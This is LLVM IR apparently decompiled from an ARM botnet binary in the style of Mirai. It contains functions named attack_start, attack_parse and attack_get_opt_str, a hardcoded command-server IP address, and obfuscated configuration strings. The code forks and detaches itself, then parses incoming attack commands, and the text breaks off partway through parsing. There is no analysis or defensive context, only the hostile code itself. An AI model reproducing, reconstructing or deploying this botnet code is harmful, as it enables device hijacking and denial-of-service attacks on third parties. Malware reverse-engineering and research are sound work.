source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

%anon_struct_4 = type { i32, i32*, i8, i8 }
%anon_struct_13 = type { i32, i32*, i8, i8 }
%anon_struct_13.3 = type { i32, i32*, i8, i8 }
%vfp_regs = type { [16 x i64], i32 }

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_z = internal unnamed_addr global i1 false
@cpsr_c = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_21690.20 = global i32 0
@global_var_d96c.24 = constant i32 -382906384
@global_var_218b4.29 = global i32 0
@global_var_831c.30 = constant i32 -352321547
@global_var_12ad4.31 = constant i32 -382909968
@global_var_a088.37 = constant i32 -382906384
@global_var_a4c0.39 = constant i32 -382906384
@global_var_89ac.41 = constant i32 -382906384
@global_var_c1dc.43 = constant i32 -382906384
@global_var_bae4.45 = constant i32 -382906384
@global_var_b330.47 = constant i32 -382906384
@global_var_9a6c.50 = constant i32 -382906384
@global_var_93d8.52 = constant i32 -382906384
@global_var_243d0.55 = global i32 0
@global_var_18fc8.67 = constant i32 47
@global_var_243d8.69 = global i32 0
@global_var_218b8.71 = global i32 0
@global_var_243d4.73 = global i32 0
@global_var_c700.74 = constant i32 -352321440
@global_var_10a64.76 = constant i32 -382910336
@global_var_d4ec.77 = constant i32 -509607932
@global_var_d834.79 = constant i32 -382910448
@global_var_21744.81 = global i32 66588
@global_var_2173c.83 = global i32 -1
@global_var_18fcc.88 = constant [15 x i8] c"159.89.179.146\00"
@global_var_243e0.91 = local_unnamed_addr global i32 0
@global_var_243de.92 = local_unnamed_addr global i32 0
@global_var_218bc.94 = global i32 0
@global_var_18fdc.102 = constant i32 10
@global_var_21740.105 = global i32 -1
@global_var_13fb0.109 = constant i32 -450904024
@global_var_1041c.110 = constant i32 -382910352
@global_var_18fe0.113 = constant i32 16777216
@global_var_218c4.115 = global i32 0
@global_var_218d0.117 = global i32 0
@global_var_218c8.119 = global i32 0
@global_var_218cc.121 = global i32 0
@global_var_21908.135 = global i32 0
@global_var_218d4.137 = global i32 0
@global_var_21900.139 = global i32 0
@global_var_243f4.143 = global i32 0
@global_var_243ec.147 = global i32 0
@global_var_243f0.149 = global i32 0
@global_var_218da.152 = local_unnamed_addr global i32 0
@global_var_218dc.156 = local_unnamed_addr global i32 0
@global_var_218e0.157 = local_unnamed_addr global i32 0
@global_var_218e1.158 = local_unnamed_addr global i32 0
@global_var_218fa.161 = local_unnamed_addr global i32 0
@global_var_18fec.163 = constant i32 0
@global_var_18fe8.165 = constant [5 x i8] c"&;; \00"
@global_var_18ff0.167 = constant [5 x i8] c"5:?;\00"
@global_var_18ff8.169 = constant [9 x i8] c"<!: acam\00"
@global_var_19004.171 = constant [7 x i8] c" 18:1 \00"
@global_var_1900c.173 = constant [8 x i8] c"0125!8 \00"
@global_var_19014.175 = constant [9 x i8] c"$5''#;&0\00"
@global_var_19020.177 = constant [6 x i8] c"509=:\00"
@global_var_19028.179 = constant [6 x i8] c"\22=.,\22\00"
@global_var_19030.181 = constant [8 x i8] c"'!$$;& \00"
@global_var_19038.183 = constant i32 423502179
@global_var_19048.185 = constant [6 x i8] c"efg`a\00"
@global_var_19050.187 = constant [5 x i8] c"!'1&\00"
@global_var_19058.189 = constant i32 943467547
@global_var_19064.191 = constant i32 322070023
@global_var_218e4.192 = local_unnamed_addr global i32 0
@global_var_218e2.193 = local_unnamed_addr global i32 0
@global_var_218e8.194 = local_unnamed_addr global i32 0
@global_var_218f0.196 = local_unnamed_addr global i32 0
@global_var_218fc.197 = local_unnamed_addr global i32 0
@global_var_e344.199 = constant i32 -382910352
@global_var_19070.201 = constant [3 x i8] c"\0D\0A\00"
@global_var_1907c.203 = constant i32 2096127
@global_var_19073.205 = constant i32 2095871
@global_var_243fc.211 = global i32 0
@global_var_2174c.214 = global i32 -555811921
@global_var_fe18.215 = constant i32 148476
@global_var_19080.219 = constant [3 x i8] c"Qm\00"
@global_var_24404.220 = local_unnamed_addr global i32 0
@global_var_24408.221 = local_unnamed_addr global i32 0
@global_var_19084.223 = constant i32 59987
@global_var_2440c.224 = local_unnamed_addr global i32 0
@global_var_24410.225 = local_unnamed_addr global i32 0
@global_var_19168.227 = constant i32 808465680
@global_var_24418.228 = local_unnamed_addr global i32 0
@global_var_24414.229 = local_unnamed_addr global i32 0
@global_var_19088.231 = constant [8 x i8] c"{$&;7{T\00"
@global_var_24464.232 = local_unnamed_addr global i32 0
@global_var_24468.233 = local_unnamed_addr global i32 0
@global_var_19090.235 = constant [6 x i8] c"{1,1T\00"
@global_var_2446c.236 = local_unnamed_addr global i32 0
@global_var_24470.237 = local_unnamed_addr global i32 0
@global_var_19098.239 = constant [5 x i8] c"{20T\00"
@global_var_24478.240 = local_unnamed_addr global i32 0
@global_var_24474.241 = local_unnamed_addr global i32 0
@global_var_190a0.243 = constant [7 x i8] c"{95$'T\00"
@global_var_2447c.244 = local_unnamed_addr global i32 0
@global_var_24480.245 = local_unnamed_addr global i32 0
@global_var_190a8.247 = constant [15 x i8] c"{$&;7{:1 { 7$T\00"
@global_var_24484.248 = local_unnamed_addr global i32 0
@global_var_24488.249 = local_unnamed_addr global i32 0
@global_var_190b8.251 = constant [9 x i8] c"{' 5 !'T\00"
@global_var_244e4.252 = local_unnamed_addr global i32 0
@global_var_244e8.253 = local_unnamed_addr global i32 0
@global_var_190c4.255 = constant [8 x i8] c"z5:=91T\00"
@global_var_244ec.256 = local_unnamed_addr global i32 0
@global_var_244f0.257 = local_unnamed_addr global i32 0
@global_var_190cc.259 = constant [17 x i8] c"{$&;7{:1 {&;! 1T\00"
@global_var_24490.260 = local_unnamed_addr global i32 0
@global_var_2448c.261 = local_unnamed_addr global i32 0
@global_var_190e0.263 = constant [9 x i8] c"5''#;&0T\00"
@global_var_24494.264 = local_unnamed_addr global i32 0
@global_var_24498.265 = local_unnamed_addr global i32 0
@global_var_19188.267 = constant i32 557516544
@global_var_244a0.268 = local_unnamed_addr global i32 0
@global_var_2449c.269 = local_unnamed_addr global i32 0
@global_var_190ec.271 = constant [18 x i8] c"{1 7{&1';8\22z7;:2T\00"
@global_var_244a8.272 = local_unnamed_addr global i32 0
@global_var_244a4.273 = local_unnamed_addr global i32 0
@global_var_19100.275 = constant [13 x i8] c":591'1&\221&tT\00"
@global_var_244b0.276 = local_unnamed_addr global i32 0
@global_var_244ac.277 = local_unnamed_addr global i32 0
@global_var_19110.279 = constant [15 x i8] c"{01\22{#5 7<0;3T\00"
@global_var_244b4.280 = local_unnamed_addr global i32 0
@global_var_244b8.281 = local_unnamed_addr global i32 0
@global_var_19120.283 = constant [20 x i8] c"{01\22{9='7{#5 7<0;3T\00"
@global_var_244c0.284 = local_unnamed_addr global i32 0
@global_var_244bc.285 = local_unnamed_addr global i32 0
@global_var_19134.287 = constant [9 x i8] c"$662*7!E\00"
@global_var_244c4.288 = local_unnamed_addr global i32 0
@global_var_244c8.289 = local_unnamed_addr global i32 0
@global_var_19140.291 = constant [6 x i8] c";3=:T\00"
@global_var_244cc.292 = local_unnamed_addr global i32 0
@global_var_244d0.293 = local_unnamed_addr global i32 0
@global_var_19148.295 = constant [7 x i8] c"1: 1&T\00"
@global_var_244d4.296 = local_unnamed_addr global i32 0
@global_var_244d8.297 = local_unnamed_addr global i32 0
@global_var_19150.299 = constant [24 x i8] c"e365`70;9ag:<$ef1=d?2>T\00"
@global_var_244dc.300 = local_unnamed_addr global i32 0
@global_var_244e0.301 = local_unnamed_addr global i32 0
@global_var_21694.308 = global i32 0
@global_var_10c20.317 = constant i32 -516948194
@global_var_10be0.319 = constant i32 68380
@global_var_10ad8.323 = constant i32 -516948194
@global_var_10dbc.333 = constant i32 -443088884
@global_var_f000.340 = constant i32 61716
@global_var_1125c.350 = constant i32 -456978431
@global_var_103f4.353 = constant i32 -514523128
@global_var_102f8.360 = constant i32 -481165303
@global_var_102b0.363 = constant i32 -481099731
@global_var_11a94.394 = constant i32 -478871519
@global_var_f3d8.398 = constant i32 167772170
@global_var_12538.412 = constant i32 -478805983
@global_var_12920.422 = constant i32 -382906384
@global_var_14a30.431 = constant i32 -442544040
@global_var_132b8.454 = constant i32 -369098502
@global_var_13c8c.468 = constant i32 -382910288
@global_var_13e3c.480 = constant i32 -2020859901
@global_var_13f28.483 = constant i32 -494075872
@global_var_10c28.484 = constant i32 -382910336
@global_var_2487c.487 = local_unnamed_addr global i32 0
@global_var_d420.492 = constant i32 -509607927
@global_var_12d50.501 = constant i32 -442543860
@global_var_111c0.509 = constant i32 -369093190
@global_var_cc84.534 = constant i32 -509607926
@global_var_cc60.536 = constant i32 -481099767
@global_var_14f28.538 = constant i32 -382910352
@global_var_16338.560 = constant i32 -382906384
@global_var_15df8.588 = constant i32 -382910448
@global_var_177e8.589 = constant i32 -382909968
@global_var_9ea8.642 = constant i32 167772257
@global_var_17f24.652 = constant i32 -481296376
@global_var_1801c.653 = constant i32 -481296376
@global_var_180a0.654 = constant i32 -369098732
@global_var_21894.10 = external global i8*
@global_var_218b0.27 = external global i8*
@global_var_218b1.35 = global i8 0
@1 = internal constant [2 x i8] c"\01\00"
@global_var_21748.85 = global i8* getelementptr inbounds ([2 x i8], [2 x i8]* @1, i32 0, i32 0)
@global_var_243dc.90 = global i16* null
@global_var_218c0.107 = external global i8*
@global_var_21904.141 = global i16* null
@global_var_218d8.151 = external global i8*
@global_var_218ec.154 = global i16 0
@global_var_218f8.155 = local_unnamed_addr global i8 0
@global_var_218ee.159 = local_unnamed_addr global i16 0
@global_var_218f9.160 = local_unnamed_addr global i8 0
@global_var_216ec.303 = local_unnamed_addr global i16 8

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v3_80d8 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_80d8)
  %v31_80e0 = load i32, i32* @r0, align 4
  ret i32 %v31_80e0
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_80f0 = load i32, i32* @r4, align 4
  store i32 %v3_80f0, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i8** @global_var_21894.10 to i32), i32* %r4.global-to-local, align 4
  %v2_80f8 = load i8, i8* bitcast (i8** @global_var_21894.10 to i8*), align 4
  %v2_80fc = icmp eq i8 %v2_80f8, 0
  br i1 %v2_80fc, label %dec_label_pc_8104, label %dec_label_pc_8120

dec_label_pc_8104:                                ; preds = %entry
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_811c = load i32, i32* %r4.global-to-local, align 4
  %v3_811c = inttoptr i32 %v2_811c to i8*
  store i8 1, i8* %v3_811c, align 1
  %v2_8120.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8120

dec_label_pc_8120:                                ; preds = %entry, %dec_label_pc_8104
  %v2_8120 = phi i32 [ %v3_80f0, %entry ], [ %v2_8120.pre, %dec_label_pc_8104 ]
  store i32 %v2_8120, i32* %r4.global-to-local, align 4
  ret i32 undef

; uselistorder directives
  uselistorder i8** @global_var_21894.10, { 1, 0 }
  uselistorder label %dec_label_pc_8120, { 1, 0 }
}

define i32 @frame_dummy() local_unnamed_addr {
bb:
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_8158 = load i32, i32* @global_var_21690.20, align 4
  %v2_815c = icmp eq i32 %v2_8158, 0
  br i1 %v2_815c, label %dec_label_pc_8174, label %dec_label_pc_8164

dec_label_pc_8164:                                ; preds = %bb
  call void @__pseudo_cond_branch(i1 false, i32 0)
  br label %dec_label_pc_8174

dec_label_pc_8174:                                ; preds = %bb, %dec_label_pc_8164
  ret i32 ptrtoint (i32* @global_var_21690.20 to i32)

; uselistorder directives
  uselistorder i32* @global_var_21690.20, { 1, 0 }
  uselistorder label %dec_label_pc_8174, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @_start(i32 %arg1, i32 %arg2) local_unnamed_addr #0 {
entry:
  %stack_var_4 = alloca i32, align 4
  %v4_819c = ptrtoint i32* %stack_var_4 to i32
  %v8_81bc = call i32 @__uClibc_main(i32 ptrtoint (i32* @global_var_d96c.24 to i32), i32 %arg2, i32* nonnull %stack_var_4, i32 32980, i32 102328, i32 %arg1, i32 %v4_819c)
  %v0_81c0 = call i32 @abort()
  ret i32 %v0_81c0
}

define i32 @attack_get_opt_str(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_81d0 = icmp eq i32 %arg1, 0
  br i1 %v2_81d0, label %dec_label_pc_8218, label %dec_label_pc_81e0

dec_label_pc_81e0:                                ; preds = %entry
  %v0_81e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_81e0 = add i32 %v0_81e0, 4
  %v2_81e0 = inttoptr i32 %v1_81e0 to i8*
  %v3_81e0 = load i8, i8* %v2_81e0, align 1
  %v4_81e0 = zext i8 %v3_81e0 to i32
  %v9_81e4 = icmp eq i32 %v4_81e0, %arg3
  br i1 %v9_81e4, label %dec_label_pc_8224, label %dec_label_pc_8208.preheader

dec_label_pc_8208.preheader:                      ; preds = %dec_label_pc_81e0
  br label %dec_label_pc_8208

dec_label_pc_81f8:                                ; preds = %dec_label_pc_8208
  %v1_81f8 = add i32 %v0_8200.in, 12
  %v2_81f8 = inttoptr i32 %v1_81f8 to i8*
  %v3_81f8 = load i8, i8* %v2_81f8, align 1
  %v4_81f8 = zext i8 %v3_81f8 to i32
  %v9_81fc = icmp eq i32 %v4_81f8, %arg3
  br i1 %v9_81fc, label %dec_label_pc_8224, label %dec_label_pc_8208

dec_label_pc_8208:                                ; preds = %dec_label_pc_8208.preheader, %dec_label_pc_81f8
  %v0_8200.in = phi i32 [ %v0_81e0, %dec_label_pc_8208.preheader ], [ %v0_8200, %dec_label_pc_81f8 ]
  %v0_8208 = phi i32 [ 0, %dec_label_pc_8208.preheader ], [ %v1_8208, %dec_label_pc_81f8 ]
  %v0_8200 = add i32 %v0_8200.in, 8
  %v1_8208 = add i32 %v0_8208, 1
  %v9_820c = icmp eq i32 %v1_8208, %arg1
  store i32 %v0_8200, i32* %r1.global-to-local, align 4
  br i1 %v9_820c, label %dec_label_pc_8218, label %dec_label_pc_81f8

dec_label_pc_8218:                                ; preds = %dec_label_pc_8208, %entry, %dec_label_pc_8224
  %v0_8218 = phi i32 [ %arg4, %entry ], [ %v2_8224, %dec_label_pc_8224 ], [ %arg4, %dec_label_pc_8208 ]
  ret i32 %v0_8218

dec_label_pc_8224:                                ; preds = %dec_label_pc_81f8, %dec_label_pc_81e0
  %v0_8224 = phi i32 [ %v0_81e0, %dec_label_pc_81e0 ], [ %v0_8200, %dec_label_pc_81f8 ]
  %v1_8224 = inttoptr i32 %v0_8224 to i32*
  %v2_8224 = load i32, i32* %v1_8224, align 4
  br label %dec_label_pc_8218

; uselistorder directives
  uselistorder i32 %v1_8208, { 1, 0 }
  uselistorder i32 %v0_8200, { 1, 0, 2 }
  uselistorder i32 %v0_8200.in, { 1, 0 }
  uselistorder i32 %v0_81e0, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8218, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8208, { 1, 0 }
}

define i32 @attack_start(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i8 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_822c = load i32, i32* @r4, align 4
  store i32 %v3_822c, i32* %stack_var_-32, align 4
  %v6_822c = load i32, i32* @r5, align 4
  %v9_822c = load i32, i32* @r6, align 4
  %v12_822c = load i32, i32* @r7, align 4
  %v0_8230 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_8230, i32* @sb, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg3, i32* @sl, align 4
  %v4_8240 = sext i8 %arg5 to i32
  store i32 %v4_8240, i32* @r8, align 4
  %v0_8244 = call i32 @__libc_fork()
  %v7_8248 = icmp eq i32 %v0_8244, -1
  %. = zext i1 %v7_8248 to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %tmp23 = icmp slt i32 %v0_8244, 1
  br i1 %tmp23, label %bb24, label %.thread2

.thread2:                                         ; preds = %entry
  br label %dec_label_pc_8268

bb24:                                             ; preds = %entry
  store i32 %., i32* @r5, align 4
  %v2_8260 = icmp eq i1 %v7_8248, false
  br i1 %v2_8260, label %dec_label_pc_8270, label %dec_label_pc_8268

dec_label_pc_8268:                                ; preds = %.thread2, %bb24
  %v2_8268 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_8268, i32* @r4, align 4
  store i32 %v6_822c, i32* @r5, align 4
  store i32 %v9_822c, i32* @r6, align 4
  store i32 %v12_822c, i32* @r7, align 4
  ret i32 %v0_8244

dec_label_pc_8270:                                ; preds = %bb24
  %v0_8270 = call i32 @__libc_fork()
  %v7_8274 = icmp eq i32 %v0_8270, -1
  store i32 %v0_8270, i32* @r4, align 4
  br i1 %v7_8274, label %dec_label_pc_82a4, label %dec_label_pc_8280

dec_label_pc_8280:                                ; preds = %dec_label_pc_8270
  %v2_8280 = icmp eq i32 %v0_8270, 0
  br i1 %v2_8280, label %dec_label_pc_8288, label %dec_label_pc_82ac

dec_label_pc_8288:                                ; preds = %dec_label_pc_8280
  %v0_8288 = load i32, i32* @r6, align 4
  %v1_828c = call i32 @sleep(i32 %v0_8288)
  store i32 %v1_828c, i32* @r0, align 4
  %v0_8290 = call i32 @getppid()
  %v2_8298 = call i32 @kill(i32 %v0_8290, i32 9)
  %v0_829c = load i32, i32* @r4, align 4
  %v1_82a0 = call i32 @__GI_exit(i32 %v0_829c)
  br label %dec_label_pc_82a4

dec_label_pc_82a4:                                ; preds = %dec_label_pc_8270, %dec_label_pc_8288
  %v0_82a4 = load i32, i32* @r5, align 4
  %v1_82a8 = call i32 @__GI_exit(i32 %v0_82a4)
  br label %dec_label_pc_82ac

dec_label_pc_82ac:                                ; preds = %dec_label_pc_8280, %dec_label_pc_82a4
  store i32 ptrtoint (i8** @global_var_218b0.27 to i32), i32* %r3.global-to-local, align 4
  %v2_82b0 = load i8, i8* bitcast (i8** @global_var_218b0.27 to i8*), align 4
  %v3_82b0 = zext i8 %v2_82b0 to i32
  %v2_82b4 = icmp eq i8 %v2_82b0, 0
  br i1 %v2_82b4, label %dec_label_pc_82f8, label %dec_label_pc_82bc

dec_label_pc_82bc:                                ; preds = %dec_label_pc_82ac
  store i32 ptrtoint (i32* @global_var_218b4.29 to i32), i32* %r3.global-to-local, align 4
  %v2_82c0 = load i32, i32* @global_var_218b4.29, align 4
  %v1_82c4 = inttoptr i32 %v2_82c0 to i32*
  %v2_82c4 = load i32, i32* %v1_82c4, align 4
  %v1_82c8 = add i32 %v2_82c4, 4
  %v2_82c8 = inttoptr i32 %v1_82c8 to i8*
  %v3_82c8 = load i8, i8* %v2_82c8, align 1
  %v4_82c8 = zext i8 %v3_82c8 to i32
  store i32 %v4_82c8, i32* %r3.global-to-local, align 4
  %v1_82cc = load i32, i32* @r7, align 4
  %v9_82cc = icmp eq i32 %v4_82c8, %v1_82cc
  br i1 %v9_82cc, label %dec_label_pc_8300, label %dec_label_pc_82ec.preheader

dec_label_pc_82ec.preheader:                      ; preds = %dec_label_pc_82bc
  %v1_82d0 = load i32, i32* @r5, align 4
  br label %dec_label_pc_82ec

dec_label_pc_82dc:                                ; preds = %dec_label_pc_82ec
  %v4_82dc = mul i32 %v1_82ec, 4
  %v5_82dc = add i32 %v4_82dc, %v2_82c0
  %v6_82dc = inttoptr i32 %v5_82dc to i32*
  %v7_82dc = load i32, i32* %v6_82dc, align 4
  %v1_82e0 = add i32 %v7_82dc, 4
  %v2_82e0 = inttoptr i32 %v1_82e0 to i8*
  %v3_82e0 = load i8, i8* %v2_82e0, align 1
  %v4_82e0 = zext i8 %v3_82e0 to i32
  store i32 %v4_82e0, i32* %r3.global-to-local, align 4
  %v9_82e4 = icmp eq i32 %v4_82e0, %v1_82cc
  br i1 %v9_82e4, label %dec_label_pc_8300, label %dec_label_pc_82ec

dec_label_pc_82ec:                                ; preds = %dec_label_pc_82ec.preheader, %dec_label_pc_82dc
  %v0_82ec = phi i32 [ %v1_82d0, %dec_label_pc_82ec.preheader ], [ %v1_82ec, %dec_label_pc_82dc ]
  %v1_82ec = add i32 %v0_82ec, 1
  %v9_82f0 = icmp eq i32 %v1_82ec, %v3_82b0
  br i1 %v9_82f0, label %dec_label_pc_82f8, label %dec_label_pc_82dc

dec_label_pc_82f8:                                ; preds = %dec_label_pc_82ec, %dec_label_pc_82ac, %dec_label_pc_8300
  %v1_82fc = call i32 @__GI_exit(i32 0)
  %v0_8310.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_8300

dec_label_pc_8300:                                ; preds = %dec_label_pc_82dc, %dec_label_pc_82bc, %dec_label_pc_82f8
  %v0_8310 = phi i32 [ %v2_82c4, %dec_label_pc_82bc ], [ %v0_8310.pre, %dec_label_pc_82f8 ], [ %v7_82dc, %dec_label_pc_82dc ]
  store i32 %arg6, i32* %r3.global-to-local, align 4
  %v1_8310 = inttoptr i32 %v0_8310 to i32*
  %v2_8310 = load i32, i32* %v1_8310, align 4
  call void @__pseudo_branch(i32 %v2_8310)
  br label %dec_label_pc_82f8

; uselistorder directives
  uselistorder i32 %v1_82ec, { 2, 0, 1 }
  uselistorder i32 %v0_8270, { 1, 2, 0 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i1 %v7_8248, { 1, 0 }
  uselistorder i32 %v0_8244, { 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 2, 0, 1 }
  uselistorder label %dec_label_pc_8300, { 2, 0, 1 }
  uselistorder label %dec_label_pc_82f8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_82ec, { 1, 0 }
  uselistorder label %dec_label_pc_82ac, { 1, 0 }
  uselistorder label %dec_label_pc_82a4, { 1, 0 }
  uselistorder label %dec_label_pc_8268, { 1, 0 }
}

define i32 @attack_parse(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v6_8328 = load i32, i32* @r5, align 4
  %v9_8328 = load i32, i32* @r6, align 4
  %v12_8328 = load i32, i32* @r7, align 4
  %v18_8328 = load i32, i32* @sb, align 4
  %v21_8328 = load i32, i32* @sl, align 4
  %v24_8328 = load i32, i32* @fp, align 4
  %v2_832c = icmp ugt i32 %arg2, 2
  %v7_832c = icmp eq i32 %arg2, 3
  store i1 %v7_832c, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* @r4, align 4
  %v0_8338 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_8338, i32* @r5, align 4
  %v2_833c = xor i1 %v7_832c, true
  %v3_833c = and i1 %v2_832c, %v2_833c
  br i1 %v3_833c, label %dec_label_pc_834c, label %dec_label_pc_8340

dec_label_pc_8340:                                ; preds = %dec_label_pc_838c, %.dec_label_pc_8340_crit_edge, %dec_label_pc_8380, %dec_label_pc_8370, %dec_label_pc_834c, %entry, %dec_label_pc_8538
  %v1_8348 = phi i32 [ %v1_8348.pre, %.dec_label_pc_8340_crit_edge ], [ %v1_8350, %dec_label_pc_838c ], [ %v1_8350, %dec_label_pc_8380 ], [ %v1_8350, %dec_label_pc_8370 ], [ %v1_8350, %dec_label_pc_834c ], [ %v0_8338, %entry ], [ %v0_853c, %dec_label_pc_8538 ]
  store i32 %v6_8328, i32* @r5, align 4
  store i32 %v9_8328, i32* @r6, align 4
  store i32 %v12_8328, i32* @r7, align 4
  store i32 %v18_8328, i32* @sb, align 4
  store i32 %v21_8328, i32* @sl, align 4
  store i32 %v24_8328, i32* @fp, align 4
  ret i32 %v1_8348

dec_label_pc_834c:                                ; preds = %entry
  %v1_834c = inttoptr i32 %v0_8338 to i32*
  %v2_834c = load i32, i32* %v1_834c, align 4
  store i32 %v2_834c, i32* %r1.global-to-local, align 4
  %v1_8350 = and i32 %v2_834c, 16711680
  store i32 %v1_8350, i32* %r0.global-to-local, align 4
  %v3_8354 = udiv i32 %v2_834c, 16777216
  %v4_8358 = udiv i32 %v1_8350, 256
  %v5_8358 = or i32 %v4_8358, %v3_8354
  %v1_835c = and i32 %v2_834c, 65280
  store i32 %v1_835c, i32* %r2.global-to-local, align 4
  %v4_8360 = mul nuw nsw i32 %v1_835c, 256
  %v5_8360 = or i32 %v5_8358, %v4_8360
  store i32 %v5_8360, i32* %r3.global-to-local, align 4
  %v7_8364 = icmp eq i32 %arg2, 4
  store i1 %v7_8364, i1* %cpsr_z.global-to-local, align 1
  %v5_8368 = call i32 @llvm.bswap.i32(i32 %v2_834c)
  store i32 %v5_8368, i32* @fp, align 4
  br i1 %v7_8364, label %dec_label_pc_8340, label %dec_label_pc_8370

dec_label_pc_8370:                                ; preds = %dec_label_pc_834c
  %v1_8370 = add i32 %v0_8338, 4
  %v2_8370 = inttoptr i32 %v1_8370 to i8*
  %v3_8370 = load i8, i8* %v2_8370, align 1
  %v4_8370 = zext i8 %v3_8370 to i32
  store i32 %v4_8370, i32* %r2.global-to-local, align 4
  %v7_8374 = icmp eq i32 %arg2, 5
  store i1 %v7_8374, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8374, label %dec_label_pc_8340, label %dec_label_pc_8380

dec_label_pc_8380:                                ; preds = %dec_label_pc_8370
  %v1_8380 = add i32 %v0_8338, 5
  %v2_8380 = inttoptr i32 %v1_8380 to i8*
  %v3_8380 = load i8, i8* %v2_8380, align 1
  %v4_8380 = zext i8 %v3_8380 to i32
  store i32 %v4_8380, i32* @sb, align 4
  %v2_8384 = icmp eq i8 %v3_8380, 0
  store i1 %v2_8384, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8384, label %dec_label_pc_8340, label %dec_label_pc_838c

dec_label_pc_838c:                                ; preds = %dec_label_pc_8380
  %v2_8390 = mul nuw nsw i32 %v4_8380, 5
  store i32 %v2_8390, i32* @r7, align 4
  %v1_8394 = add i32 %arg2, -6
  store i32 %v1_8394, i32* %r3.global-to-local, align 4
  %v3_8398 = icmp ult i32 %v1_8394, %v2_8390
  %v9_8398 = icmp eq i32 %v1_8394, %v2_8390
  store i1 %v9_8398, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_8398, label %dec_label_pc_8340, label %dec_label_pc_83a0

dec_label_pc_83a0:                                ; preds = %dec_label_pc_838c
  store i32 %v4_8380, i32* %r0.global-to-local, align 4
  store i32 24, i32* %r1.global-to-local, align 4
  store i32 %v1_8394, i32* @r6, align 4
  %v2_83ac = call i32 @calloc(i32 %v4_8380, i32 24)
  store i32 %v2_83ac, i32* %ip.global-to-local, align 4
  %v0_83b8 = load i32, i32* @r7, align 4
  %v1_83b8 = load i32, i32* @r4, align 4
  %v2_83b8 = sub i32 %v1_83b8, %v0_83b8
  store i32 %v2_83b8, i32* @r7, align 4
  %v0_83bc = load i32, i32* @r5, align 4
  %v1_83bc = add i32 %v0_83bc, 11
  store i32 %v1_83bc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_83c0

dec_label_pc_83c0:                                ; preds = %dec_label_pc_83c0, %dec_label_pc_83a0
  %v1_83c4 = phi i32 [ %v1_83f0, %dec_label_pc_83c0 ], [ %v2_83ac, %dec_label_pc_83a0 ]
  %v0_83c0 = phi i32 [ %v1_83ec, %dec_label_pc_83c0 ], [ %v1_83bc, %dec_label_pc_83a0 ]
  %v1_83c0 = add i32 %v0_83c0, -5
  %v2_83c0 = inttoptr i32 %v1_83c0 to i32*
  %v3_83c0 = load i32, i32* %v2_83c0, align 4
  store i32 %v3_83c0, i32* %r1.global-to-local, align 4
  %v2_83c4 = add i32 %v1_83c4, 16
  %v3_83c4 = inttoptr i32 %v2_83c4 to i32*
  store i32 %v3_83c0, i32* %v3_83c4, align 4
  %v0_83c8 = load i32, i32* @r7, align 4
  %v1_83c8 = add i32 %v0_83c8, -6
  store i32 %v1_83c8, i32* %r3.global-to-local, align 4
  %v0_83cc = load i32, i32* %r0.global-to-local, align 4
  %v1_83cc = add i32 %v0_83cc, -1
  %v2_83cc = inttoptr i32 %v1_83cc to i8*
  %v3_83cc = load i8, i8* %v2_83cc, align 1
  %v4_83cc = zext i8 %v3_83cc to i32
  store i32 %v4_83cc, i32* %r2.global-to-local, align 4
  %v0_83d0 = load i32, i32* @r6, align 4
  %v1_83d0 = add i32 %v0_83d0, -5
